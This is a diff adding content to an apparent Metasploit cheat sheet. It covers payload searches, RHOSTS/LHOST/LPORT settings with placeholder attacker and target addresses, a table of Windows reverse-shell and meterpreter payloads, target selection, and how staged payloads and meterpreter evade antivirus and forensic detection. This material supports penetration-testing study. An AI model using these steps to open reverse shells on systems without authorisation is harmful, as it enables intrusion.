@@ -153,6 +153,18 @@ Specific search
 search type:exploit platform:windows cve:2021 rank:excellent microsoft
 ```  
 
+Specific payload search
+
+```bash
+grep meterpreter show payloads
+```
+
+Even more specific search
+
+```bash
+grep meterpreter grep reverse_tcp show payloads
+```
+
 </details>
 
 <details>
@@ -175,16 +187,40 @@ options
 <details>
 <summary><h4>Set</h4></summary>
 
-Target Specification
+**Target Specification**
 
 ```bash
 set RHOSTS <TARGET IP>
 ```  
 
-Permanent Target Specification
+**Permanent Target Specification**
 
 ```bash
 setg RHOSTS <TARGET IP>
+```  
+
+**Target Port Specification**
+
+```bash
+set RPORT <TARGET PORT>
+```  
+
+**Attacker IP specification**
+
+```bash
+set LHOST <ATTACKER IP>
+```  
+
+**Permanent Attacker IP specification**
+
+```bash
+setg LHOST <ATTACKER IP>
+```  
+
+**Attacker Port Specification**
+
+```bash
+set LPORT <ATTACKER PORT>
 ```  
 
 </details>
@@ -213,17 +249,144 @@ run
 
 </details>
 
+
+<details>
+<summary><h3>Common Payloads</h3></summary>
+
+The table below contains the most common payloads used for Windows machines and their respective descriptions.
+
+
+| Payload                             | Description                                                                 |
+|-------------------------------------|-----------------------------------------------------------------------------|
+| generic/custom                      | Generic listener, multi-use                                                |
+| generic/shell_bind_tcp              | Generic listener, multi-use, normal shell, TCP connection binding          |
+| generic/shell_reverse_tcp           | Generic listener, multi-use, normal shell, reverse TCP connection          |
+| windows/x64/exec                    | Executes an arbitrary command (Windows x64)                                |
+| windows/x64/loadlibrary             | Loads an arbitrary x64 library path                                        |
+| windows/x64/messagebox              | Spawns a dialog via MessageBox with customizable title, text & icon        |
+| windows/x64/shell_reverse_tcp       | Normal shell, single payload, reverse TCP connection                       |
+| windows/x64/shell/reverse_tcp       | Normal shell, stager + stage, reverse TCP connection                       |
+| windows/x64/shell/bind_ipv6_tcp     | Normal shell, stager + stage, IPv6 Bind TCP stager                         |
+| windows/x64/meterpreter/$           | Meterpreter payload + varieties above                                      |
+| windows/x64/powershell/$            | Interactive PowerShell sessions + varieties above                          |
+| windows/x64/vncinject/$             | VNC Server (Reflective Injection) + varieties above  
+
+</details>
+
 <details>
 <summary><h3>Targets</h3></summary>
 
-Text
+Targets are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system.
+
+**Show Targets**  
+
+```bash
+show targets
+```
+
+Regular output:
+```bash
+# Exploit targets:
+# 
+#    Id  Name
+#    --  ----
+#    0   Automatic
+```
+
+Exploit-specific output:
+```bash
+# Exploit targets:
+# 
+#    Id  Name
+#    --  ----
+#    0   Automatic
+#    1   IE 7 on Windows XP SP3
+#    2   IE 8 on Windows XP SP3
+#    3   IE 7 on Windows Vista
+#    4   IE 8 on Windows Vista
+#    5   IE 8 on Windows 7
+#    6   IE 9 on Windows 7
+```
+
+**Select Targets**  
+
+```bash
+set target 6
+```
 
 </details>
 
 <details>
 <summary><h3>Payloads</h3></summary>
 
-Text
+A Payload in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker. There are three different types of payload modules in the Metasploit Framework: Singles, Stagers, and Stages.
+
+**Show all payloads**
+
+```bash
+show payloads
+```
+
+<details>
+<summary><h4>Singles</h4></summary>
+
+A _Single_ payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. A Single payload can be as simple as adding a user to the target system or booting up a process.
+</details>
+
+<details>
+<summary><h4>Stagers</h4></summary>
+
+_Stager_ payloads work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host. Stagers are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable.  
+
+</details>
+
+<details>
+<summary><h4>Stages</h4></summary>
+
+_Stages_ are payload components that are downloaded by stager's modules.  
+
+Payload stages automatically use middle stagers:
+
+* A single recv() fails with large payloads
+* The Stager receives the middle stager
+* The middle Stager then performs a full download
+* Also better for RWX
+
+</details>
+
+</details>
+
+<details>
+<summary><h3>Staged Payloads</h3></summary>
+
+A staged payload is, simply put, an exploitation process that is modularized and functionally separated to help segregate the different functions it accomplishes into different code blocks, each completing its objective individually but working on chaining the attack together.  
+
+The scope of this payload, as with any others, besides granting shell access to the target system, is to be as compact and inconspicuous as possible to aid with the Antivirus (AV) / Intrusion Prevention System (IPS) evasion as much as possible.
+
+Reverse connections **(stage0)** are less likely to trigger prevention systems like the one initializing the connection is the victim host, which most of the time resides in what is known as a security trust zone.
+
+After the stable communication channel is established between the attacker and the victim, the attacker machine will most likely send an even bigger payload stage which should grant them shell access **(stage1)**.
+
+<details>
+<summary><h4>Meterpreter Payload</h4></summary>
+
+The Meterpreter payload is a specific type of multi-faceted payload that:
+
+- Uses **DLL injection** to establish a stable and covert connection with the victim host.
+- Is designed to be **difficult to detect** using simple or conventional system checks.
+- Maintains **persistence** across system reboots or changes (depending on configuration).
+- Resides **entirely in memory**, leaving **no traces on the hard drive**.
+- Evades many **traditional forensic detection techniques**.
+- Allows **dynamic loading and unloading of scripts and plugins** during runtime.
+
+</details>
+
+<details>
+<summary><h4>Searching for Specific Payload</h4></summary>
+
+
+
+</details>
 
 </details>
 
